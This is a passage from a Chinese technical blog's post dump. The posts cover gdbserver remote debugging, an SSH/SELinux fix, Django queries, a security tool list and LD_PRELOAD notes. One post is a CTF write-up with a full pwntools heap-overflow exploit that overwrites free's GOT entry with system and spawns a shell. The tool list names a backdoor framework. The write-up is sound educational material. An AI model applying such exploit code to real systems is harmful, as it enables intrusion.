class=\"code\"><pre><span class=\"line\">cd /root/work/hello</span><br><span class=\"line\">mkdir build</span><br><span class=\"line\">cd build</span><br><span class=\"line\">cmake .. </span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n<p>在根目录下生成build目录，存放cmake构建的结果，其中包含生成的Makefile文件，然后使用make命令，会在build目录中生成可执行文件hello。</p>\n<p>运行gdbserver</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdbserver 0.0.0.0:1234 /root/work/hello/build/hello</span><br></pre></td></tr></table></figure>\n<h2 id=\"Mac-远程连接调试\"><a href=\"#Mac-远程连接调试\" class=\"headerlink\" title=\"Mac 远程连接调试\"></a>Mac 远程连接调试</h2><p>将虚拟机上的构建完成的整个项目文件拷贝到Mac上，存放路径为/Users/xxxuser/Pictures/hello</p>\n<p>使用clion打开，配置debug选项为GDB Remote Debug。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GDB: Bundled GDB multiarch</span><br><span class=\"line\">&apos;target remote&apos; args: tcp:172.16.40.130:1234</span><br><span class=\"line\">Symbol file: /Users/xxxuser/Pictures/hello/build/hello</span><br><span class=\"line\">Path mapping: /root/work/hello /Users/xxxuser/Pictures/hello</span><br></pre></td></tr></table></figure>\n<p>‘target remote’ 参数中 172.16.40.130 为虚拟机的ip地址。</p>\n<p>然后点击调试按钮，若连接上gdbserver, Console会显示 Debugger connected to tcp:172.16.40.130:1234。gdbserver 也会显示相应的连接信息。之后就可以愉快的使用clion进行远程调试了。</p>\n<h2 id=\"踩坑之旅\"><a href=\"#踩坑之旅\" class=\"headerlink\" title=\"踩坑之旅\"></a>踩坑之旅</h2><p>上面的步骤基本可以实现正常调试的功能。当然为了达成这个目标也是踩了不少坑，记录一下，备忘或给他人提供一些参考。</p>\n<h3 id=\"clion-gdb-连不上。\"><a href=\"#clion-gdb-连不上。\" class=\"headerlink\" title=\"clion gdb 连不上。\"></a>clion gdb 连不上。</h3><p>clion进行远程调试，出现连接不上的问题，结果如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp:172.16.40.130:1234: Operation timed out.</span><br><span class=\"line\">Debugger disconnected</span><br></pre></td></tr></table></figure>\n<p>在mac上可以ssh登录虚拟机，但是clion死活连不上虚拟机的gdbserver。排除clion软件的代理等问题，首先在虚拟机上使用gdb进行远程连接</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$gdb</span><br><span class=\"line\">(gdb) target remote 127.0.0.1:1234</span><br><span class=\"line\">(gdb) q</span><br><span class=\"line\"></span><br><span class=\"line\">$gdb</span><br><span class=\"line\">(gdb) target remote 172.16.40.130:1234</span><br><span class=\"line\">(gdb) q</span><br></pre></td></tr></table></figure>\n<p>在虚拟机上使用gdb连接127.0.0.1和172.16.40.130两种方式进行连接，发现可以连上127.0.0.1，不能连上172.16.40.130，那么很可能是iptables的问题，禁用iptables后连接正常。</p>\n<p>配置CentOS关闭防火墙</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service iptables stop</span><br><span class=\"line\">chkconfig iptables off</span><br></pre></td></tr></table></figure>\n<h3 id=\"No-source-file-named-main-cpp-问题\"><a href=\"#No-source-file-named-main-cpp-问题\" class=\"headerlink\" title=\"No source file named main.cpp 问题\"></a>No source file named main.cpp 问题</h3><ul>\n<li>第一种 CMake 源文件路径配置</li>\n</ul>\n<p>当CMakeLists.txt中未配置源文件路径时，clion启动gdb时，Debugger-&gt;GDB页面会出现No source file named main.cpp。</p>\n<p>例如之前的错误配置为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Make 最低版本号要求</span><br><span class=\"line\">cmake_minimum_required(VERSION 2.8)</span><br><span class=\"line\"></span><br><span class=\"line\"># 项目信息</span><br><span class=\"line\">project(hello)</span><br><span class=\"line\"></span><br><span class=\"line\"># 配置gdb调试</span><br><span class=\"line\">set(CMAKE_BUILD_TYPE &quot;Debug&quot;)</span><br><span class=\"line\">set(CMAKE_CXX_FLAGS_DEBUG &quot;$ENV&#123;CXXFLAGS&#125; -O0 -Wall -g3 -ggdb&quot;)</span><br><span class=\"line\">set(CMAKE_CXX_FLAGS_RELEASE &quot;$ENV&#123;CXXFLAGS&#125; -O3 -Wall&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 指定生成目标</span><br><span class=\"line\">add_executable(hello main.cpp)</span><br></pre></td></tr></table></figure>\n<p>在CMakeLists.txt文件中添加<code>set(SOURCE_FILES main.cpp)</code>指定源文件，解决读取不到main.cpp的问题</p>\n<ul>\n<li>第二种 程序编译选项</li>\n</ul>\n<p>clion正常连接gdbserver后，在main.cpp文件中设置断点，出现No source file named main.cpp, 并且程断点也无效。</p>\n<p>对应的cmake文件配置为<code>set(CMAKE_CXX_FLAGS_DEBUG &quot;$ENV{CXXFLAGS} -O0 -Wall -g -ggdb&quot;)</code>,使用的是-g选项, 经过网上一番搜索，设置-g3选项生效，即<code>set(CMAKE_CXX_FLAGS_DEBUG &quot;$ENV{CXXFLAGS} -O0 -Wall -g3 -ggdb&quot;)</code>。其中-g对应的是-g2, -g3产生更多的调试信息，例如-g3级别支持宏扩展。</p>\n<p>可能是clion远程调试需要更多的调试信息，-g2级别不够，设置成-g3后就可以正常下断点调试，和本地调试无异。</p>\n<h2 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h2><ul>\n<li>cmake不是必须的</li>\n</ul>\n<p>虽然clion默认使用cmake构建，使用gdbserver进行远程调试，可以不使用cmake构建，构建工具不重要，只要满足源码目录和二进制程序，本地和远程相同即可。文中先前理解有误，特此修正。</p>\n","categories":["note"],"tags":[]},{"title":"【note】CentOS免密登录问题排查","url":"http://www.beesfun.com/2018/07/19/【note】CentOS免密登录问题排查/","content":"<p>CentOS 6.5 免密登陆问题排查，服务器ssh服务器运行正常，使用用户名和密码登陆服务器正常，但是使用秘钥登陆一直失败，于是先排查sshd配置文件<code>/etc/ssh/sshd_config</code>,支持秘钥认证登陆</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RSAAuthentication yes</span><br><span class=\"line\">PubkeyAuthentication yes</span><br><span class=\"line\">AuthorizedKeysFile      .ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>修改文件重启ssh服务后，仍旧不能免密登陆。于是排查各文件和文件夹权限，修改为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">drwx------. 3 root root 4096 7月  18 20:22 /root</span><br><span class=\"line\">drwx------.  2 root root 4096 7月  18 22:56 .ssh</span><br><span class=\"line\">-rw-------. 1 root root  396 7月  18 22:56 authorized_keys</span><br></pre></td></tr></table></figure>\n<p>还是不行，从客户端<code>ssh -v</code>显示的信息依旧看不出什么问题，接下来排查ssh服务器日志。</p>\n<a id=\"more\"></a>\n<h2 id=\"ssh-服务器日志排查\"><a href=\"#ssh-服务器日志排查\" class=\"headerlink\" title=\"ssh 服务器日志排查\"></a>ssh 服务器日志排查</h2><p>ssh服务器日志位于 <code>/var/log/secure</code>，默认日志记录的INFO信息，需要修改日志记录级别为DEBUG，修改<code>/etc/ssh/sshd_config</code>文件中<code>LogLevel INFO</code> 为 <code>LogLevel DEBUG</code>，重启ssh服务器<code>service sshd restart</code>。</p>\n<p>尝试ssh登陆，发现问题在于不能读取authorized_keys</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Jul 18 23:01:05 centos sshd[1564]: debug1: trying public key file /root/.ssh/authorized_keys</span><br><span class=\"line\">Jul 18 23:01:05 centos sshd[1564]: debug1: Could not open authorized keys &apos;/root/.ssh/authorized_keys&apos;: Permission denied</span><br></pre></td></tr></table></figure>\n<p>参考 <a href=\"https://stackoverflow.com/questions/20688844/sshd-gives-error-could-not-open-authorized-keys-although-permissions-seem-corre，问题在于SELinux阻止sshd打开文件。\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/questions/20688844/sshd-gives-error-could-not-open-authorized-keys-although-permissions-seem-corre，问题在于SELinux阻止sshd打开文件。</a></p>\n<p>执行：<code>restorecon -FRvv ~/.ssh</code>， 解决问题。</p>\n<h2 id=\"问题分析\"><a href=\"#问题分析\" class=\"headerlink\" title=\"问题分析\"></a>问题分析</h2><p>该问题本质应该是<code>authorized_keys</code>文件的context不正确，正常情况下应该是<code>ssh_home_t</code>，如果是<code>admin_home_t</code>则是错误的。可以使用<code>estorecon</code>命令进行恢复。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@centos ~]# ls -alZ .ssh/</span><br><span class=\"line\">drwx------. root root system_u:object_r:ssh_home_t:s0  .</span><br><span class=\"line\">drwx------. root root system_u:object_r:admin_home_t:s0 ..</span><br><span class=\"line\">-rw-------. root root system_u:object_r:ssh_home_t:s0  authorized_keys</span><br></pre></td></tr></table></figure>\n","categories":["note"],"tags":[]},{"title":"【develop】django 同表GroupBy排序查询","url":"http://www.beesfun.com/2018/01/09/【develop】django-同表GroupBy排序查询/","content":"<p>通常django中涉及group by查询多是多个表之间的联合查询，使用外键搭建桥梁。碰到过同表group by查询的案例，发现弄起来还挺麻烦的，故记录下，涨涨见识。<br><a id=\"more\"></a></p>\n<h2 id=\"django-annotate\"><a href=\"#django-annotate\" class=\"headerlink\" title=\"django annotate\"></a>django annotate</h2><p>django annotate注解功能可以用在多个表的分组统计，也可以用在同表的分组统计。 如果需要统计某个字段出现的数量需要使用’values’.</p>\n<p>If you just need the total number of events for a single area, you don’t need either annotate or aggregate, a simple count will do:<br><code>SomeModel.objects.filter(some_colname=xx_colname).count()</code></p>\n<p>If you want the count of events for multiple areas, you need annotate in conjunction with values:<br><code>SomeModel.objects.values(&#39;some_colname&#39;).annotate(num_col=Count(&#39;some_colname&#39;))</code></p>\n<p>也就是说，如果要用某个字段出现的次数排序的话，通常这样使用：<br><code>SomeModel.objects.values(&#39;some_colname&#39;).annotate(num_col=Count(&#39;some_colname&#39;)).order_by(&#39;-num_col&#39;)</code>,<br>这样做是没有问题的，但是返回的字段中就只有<code>some_colname</code>字段了，不能做到返回所有字段，或任意指定的字段。如果要满足这个条件，目前使用的是原生的sql语句，参考: <a href=\"https://stackoverflow.com/questions/2283305/order-by-count-per-value\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/questions/2283305/order-by-count-per-value</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sql = (<span class=\"string\">'select a.* from some_table a join(select xx_id, count(*) as cnt from some_table '</span></span><br><span class=\"line\">       <span class=\"string\">'group by xx_id)b on (b.xx_id=a.xx_id) order by b.cnt desc'</span>)</span><br><span class=\"line\">records = SomeModel.objects.raw(sql)</span><br></pre></td></tr></table></figure>","categories":["develop"],"tags":["django","sql"]},{"title":"【Tool】常用工具整理","url":"http://www.beesfun.com/2017/12/27/【Tool】常用工具整理/","content":"<h2 id=\"在线工具\"><a href=\"#在线工具\" class=\"headerlink\" title=\"在线工具\"></a>在线工具</h2><ul>\n<li><a href=\"https://www.ipip.net\" target=\"_blank\" rel=\"noopener\">ipip.net</a></li>\n<li><a href=\"http://www.shucunwang.com/RunCode/csharp/\" target=\"_blank\" rel=\"noopener\">在线编程</a></li>\n<li><a href=\"http://zaa.ch/jsonlint/\" target=\"_blank\" rel=\"noopener\">JSON在线格式化</a></li>\n<li><a href=\"http://www.shellcheck.net/\" target=\"_blank\" rel=\"noopener\">shell在线语法检测</a></li>\n</ul>\n<a id=\"more\"></a>\n<h2 id=\"威胁情报平台\"><a href=\"#威胁情报平台\" class=\"headerlink\" title=\"威胁情报平台\"></a>威胁情报平台</h2><ul>\n<li><a href=\"https://www.threatcrowd.org/\" target=\"_blank\" rel=\"noopener\">threat crowd</a></li>\n<li><a href=\"https://ti.360.net/\" target=\"_blank\" rel=\"noopener\">360威胁情报中心</a> </li>\n<li><a href=\"https://x.threatbook.cn/\" target=\"_blank\" rel=\"noopener\">微步在线</a></li>\n<li><a href=\"https://otx.alienvault.com/\" target=\"_blank\" rel=\"noopener\">AlienVault</a></li>\n<li><a href=\"https://www.venuseye.com.cn/\" target=\"_blank\" rel=\"noopener\">启明\b星辰 VenusEye</a></li>\n</ul>\n<h2 id=\"恶意软件分析\"><a href=\"#恶意软件分析\" class=\"headerlink\" title=\"恶意软件分析\"></a>恶意软件分析</h2><ul>\n<li><a href=\"https://www.hybrid-analysis.com/\" target=\"_blank\" rel=\"noopener\">Free Automated Malware Analysis Service - powered by Falcon Sandbox</a></li>\n<li><a href=\"https://www.virustotal.com/#/home/upload\" target=\"_blank\" rel=\"noopener\">virustotal</a></li>\n<li><a href=\"https://habo.qq.com/\" target=\"_blank\" rel=\"noopener\">哈勃分析系统</a></li>\n</ul>\n<h2 id=\"数据包分析工具\"><a href=\"#数据包分析工具\" class=\"headerlink\" title=\"数据包分析工具\"></a>数据包分析工具</h2><ul>\n<li><a href=\"https://www.wireshark.org/\" target=\"_blank\" rel=\"noopener\">wireshark</a></li>\n<li><a href=\"http://www.tcpdump.org/\" target=\"_blank\" rel=\"noopener\">tcpdump</a></li>\n</ul>\n<h2 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h2><ul>\n<li><a href=\"https://www.valentina-db.com/en/studio/download/current\" target=\"_blank\" rel=\"noopener\">Valentina Studio</a>: 跨平台数据库管理</li>\n</ul>\n<h2 id=\"指纹识别工具\"><a href=\"#指纹识别工具\" class=\"headerlink\" title=\"指纹识别工具\"></a>指纹识别工具</h2><ul>\n<li><a href=\"https://nmap.org/\" target=\"_blank\" rel=\"noopener\">nmap</a></li>\n<li><a href=\"https://github.com/robertdavidgraham/masscan\" target=\"_blank\" rel=\"noopener\">masscan</a></li>\n<li><a href=\"https://github.com/zmap/\" target=\"_blank\" rel=\"noopener\">zmap</a></li>\n<li><a href=\"https://wappalyzer.com/\" target=\"_blank\" rel=\"noopener\">Wappalyzer</a></li>\n<li><a href=\"https://www.shodan.io/\" target=\"_blank\" rel=\"noopener\">shodan</a></li>\n</ul>\n<h2 id=\"入侵检测\"><a href=\"#入侵检测\" class=\"headerlink\" title=\"入侵检测\"></a>入侵检测</h2><ul>\n<li><a href=\"https://www.snort.org/\" target=\"_blank\" rel=\"noopener\">snort</a></li>\n<li><a href=\"https://suricata-ids.org/\" target=\"_blank\" rel=\"noopener\">suricata</a></li>\n<li><a href=\"https://www.bro.org/\" target=\"_blank\" rel=\"noopener\">bro</a></li>\n<li><a href=\"https://ossec.github.io/\" target=\"_blank\" rel=\"noopener\">ossec</a></li>\n<li><a href=\"https://www.alienvault.com/products/ossim\" target=\"_blank\" rel=\"noopener\">ossim</a></li>\n<li><a href=\"https://securityonion.net/\" target=\"_blank\" rel=\"noopener\">security onion</a></li>\n</ul>\n<h2 id=\"代理工具\"><a href=\"#代理工具\" class=\"headerlink\" title=\"代理工具\"></a>代理工具</h2><ul>\n<li><a href=\"https://portswigger.net/burp/\" target=\"_blank\" rel=\"noopener\">Burp Suite</a></li>\n</ul>\n<h2 id=\"漏洞扫描利用工具\"><a href=\"#漏洞扫描利用工具\" class=\"headerlink\" title=\"漏洞扫描利用工具\"></a>漏洞扫描利用工具</h2><ul>\n<li><a href=\"http://sqlmap.org/\" target=\"_blank\" rel=\"noopener\">sqlmap</a></li>\n<li><a href=\"https://github.com/rapid7/metasploit-framework\" target=\"_blank\" rel=\"noopener\">metasploit</a></li>\n</ul>\n<h2 id=\"其他工具\"><a href=\"#其他工具\" class=\"headerlink\" title=\"其他工具\"></a>其他工具</h2><ul>\n<li><a href=\"https://github.com/aploium/shootback\" target=\"_blank\" rel=\"noopener\">shootback</a>: a reverse TCP tunnel</li>\n<li><a href=\"https://github.com/operatorequals/covertutils\" target=\"_blank\" rel=\"noopener\">covertutils</a>: A framework for Backdoor</li>\n</ul>\n","categories":["Tool"],"tags":["tools"]},{"title":"【CTF】shellman堆溢出","url":"http://www.beesfun.com/2017/12/21/【CTF】shellman堆溢出/","content":"<p>题目来自于2015年强网杯的一道二进制题目shellman, 程序流程很清晰，阅读ida逆向后的代码很容易发现在编辑shellcode时存在溢出，一道很明显的堆溢出二进制漏洞，至于怎么利用，初始想的是利用fastbin attackg攻击，改掉shellcode管理中记录分配的地址，再利用edit功能，修改给出的函数的got地址，改为shellcode地址，后来发现开启的堆栈保护，不能利用，由于堆内容是可控的，结合delete功能，修改free函数的got地址为system地址，system执行堆上的命令，具体细节网上也很多，可参考后文链接，只是网上的都是基于堆溢出+unlink的攻击方式，这里给出堆溢出加fastbin attack的攻击方法, 详情见POC.</p>\n<a id=\"more\"></a>\n<ul>\n<li>POC</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch=<span class=\"string\">'amd64'</span></span><br><span class=\"line\">context.os=<span class=\"string\">'linux'</span></span><br><span class=\"line\">context.word_size = <span class=\"number\">64</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">'./shellman'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">stack_addr = <span class=\"number\">0x6016C0</span> + <span class=\"number\">8</span>*<span class=\"number\">3</span>*<span class=\"number\">2</span></span><br><span class=\"line\">free_got_addr = <span class=\"number\">0x601600</span></span><br><span class=\"line\">system_offset_free = <span class=\"number\">-258400</span>    <span class=\"comment\"># ubuntu16.04 glibc 2.2.5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">new_code</span><span class=\"params\">(code)</span>:</span></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">'&gt; '</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">'2'</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">': '</span>)</span><br><span class=\"line\">    io.sendline(str(len(code)))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">': '</span>)</span><br><span class=\"line\">    io.send(code)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete_code</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">'&gt; '</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">'4'</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">': '</span>)</span><br><span class=\"line\">    io.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit_code</span><span class=\"params\">(idx, code)</span>:</span></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">'&gt; '</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">': '</span>)</span><br><span class=\"line\">    io.sendline(str(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">': '</span>)</span><br><span class=\"line\">    io.sendline(str(len(code)))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">': '</span>)</span><br><span class=\"line\">    io.send(code)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">list_code</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">'&gt; '</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">'1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">new_code(<span class=\"string\">'A'</span>*<span class=\"number\">32</span>)</span><br><span class=\"line\">new_code(<span class=\"string\">'A'</span>*<span class=\"number\">16</span>)</span><br><span class=\"line\">new_code(<span class=\"string\">'A'</span>*<span class=\"number\">32</span>)</span><br><span class=\"line\">delete_code(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">overflow = <span class=\"string\">'A'</span>*<span class=\"number\">32</span> + p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">33</span>)+p64(stack_addr)</span><br><span class=\"line\">edit_code(<span class=\"number\">0</span>, overflow)</span><br><span class=\"line\">new_code(<span class=\"string\">'/bin/sh\\x00'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">new_code(p64(free_got_addr))</span><br><span class=\"line\">list_code()</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">'SHELLC0DE 2: '</span>)</span><br><span class=\"line\">free_addr = io.recvline().strip()[:<span class=\"number\">16</span>]</span><br><span class=\"line\">addrs = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(free_addr), <span class=\"number\">2</span>):</span><br><span class=\"line\">    addrs.append(free_addr[i:i+<span class=\"number\">2</span>])</span><br><span class=\"line\">addrs.reverse()</span><br><span class=\"line\">free_addr = <span class=\"string\">''</span>.join(addrs)</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'leak libc free addr: '</span> + free_addr</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = int(free_addr, <span class=\"number\">16</span>) + system_offset_free</span><br><span class=\"line\"></span><br><span class=\"line\">edit_code(<span class=\"number\">2</span>, p64(system_addr))</span><br><span class=\"line\">delete_code(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"REF\"><a href=\"#REF\" class=\"headerlink\" title=\"REF\"></a>REF</h2><ol>\n<li><a href=\"http://www.cnblogs.com/shangye/p/6261606.html\" target=\"_blank\" rel=\"noopener\">伪造堆块绕过unlink检查 ctf-QiangWangCup-2015-shellman </a></li>\n<li><a href=\"http://tyrande000.how/2016/03/21/linux%E5%A0%86%E6%BA%A2%E5%87%BA%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/\" target=\"_blank\" rel=\"noopener\">linux堆溢出实例分析</a></li>\n</ol>\n","categories":["CTF"],"tags":["堆溢出","fastbin"]},{"title":"【note】Linux加载动态链接库","url":"http://www.beesfun.com/2017/12/19/【note】Linux加载动态链接库/","content":"<h3 id=\"LIBRARY-PATH-和-LD-LIBRARY-PATH\"><a href=\"#LIBRARY-PATH-和-LD-LIBRARY-PATH\" class=\"headerlink\" title=\"LIBRARY_PATH 和 LD_LIBRARY_PATH\"></a>LIBRARY_PATH 和 LD_LIBRARY_PATH</h3><p>LIBRARY_PATH和LD_LIBRARY_PATH是Linux下的两个环境变量，二者的含义和作用分别如下：</p>\n<ol>\n<li>LIBRARY_PATH环境变量用于在<strong>*程序编译期间*</strong>查找动态链接库时指定查找共享库的路径，例如，指定gcc编译需要用到的动态链接库的目录。</li>\n<li>LD_LIBRARY_PATH环境变量用于在<strong>*程序加载运行期间*</strong>查找动态链接库时指定除了系统默认路径之外的其他路径，注意，LD_LIBRARY_PATH中指定的路径会在系统默认路径之前进行查找。</li>\n</ol>\n<p><strong>区别与使用：</strong></p>\n<ol>\n<li>开发时，设置LIBRARY_PATH，以便gcc能够找到编译时需要的动态链接库。</li>\n<li>发布时，设置LD_LIBRARY_PATH，以便程序加载运行时能够自动找到需要的动态链接库。</li>\n<li>GCC里的链接器的选项是 -rpath 和 -rpath-link<a id=\"more\"></a>\n<h2 id=\"临时指定动态链接库\"><a href=\"#临时指定动态链接库\" class=\"headerlink\" title=\"临时指定动态链接库\"></a>临时指定动态链接库</h2></li>\n</ol>\n<p>LD_LIBRARY_PATH 或 LD_PRELOAD</p>\n<ul>\n<li>设置LD_LIBRARY_PATH</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export LD_LIBRARY_PATH=/home/xxx/Desktop:$LD_LIBRARY_PATH</span><br></pre></td></tr></table></figure>\n<p>其中 <strong>/home/plusls/Desktop</strong> 为so文件所在的目录</p>\n<p><strong>注：这样设置后 pwntools 起的进程也会继承该环境变量，加载此libc</strong></p>\n<ul>\n<li>设置LD_PRELOAD</li>\n</ul>\n<p>终端设置LD_PRELOAD，指定程序运行要加载的动态链接库，如：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LD_PRELOAD=./libc.so.6 ./app</span><br></pre></td></tr></table></figure>\n","categories":["note"],"tags":["linux","动态链接库"]},{"title":"【note】celery基本使用","url":"http://www.beesfun.com/2017/12/08/【note】celery基本使用/","content":"<p>Celery 是一个异步的分布式任务队列，主要用于实时处理和任务调度。不过它的消息中间件是默认选择使用 rabbitmq。</p>\n<p>Celery 包含的组件：</p>\n<ol>\n<li>Celery Beat: 任务调度器，用来调度周期任务。</li>\n<li>Producer: 任务生产者，调用 Celery 产生任务。</li>\n<li>Broker: 消息中间件，任务消息存进队列，再按序发送给消费者。</li>\n<li>Celery Worker: 执行任务的消费者，通常可以进行在多台服务器上运行多个消费者。</li>\n<li>Result Backend: 任务处理完成之后保存状态信息和结果，一般是数据库。</li>\n</ol>\n<p>Celery 产生任务的方式有两种</p>\n<ol>\n<li>发布者发布任务</li>\n<li>任务调度按时发布定时任务</li>\n</ol>\n<a id=\"more\"></a>\n<p>Celery 的架构</p>\n<img src=\"/2017/12/08/【note】celery基本使用/1.png\">\n<h2 id=\"样例\"><a href=\"#样例\" class=\"headerlink\" title=\"样例\"></a>样例</h2><ul>\n<li>Requirement<ul>\n<li>Python 2.7.12</li>\n<li>pymongo&gt;=3.5.1 </li>\n<li>celery[msgpack]&gt;=4.1.0</li>\n</ul>\n</li>\n</ul>\n<p>文件配置和常见结构一致，相关配置均在celeryconfig,py文件中，处理的任务中有一个定时调度任务feeddog, worker任务eat, 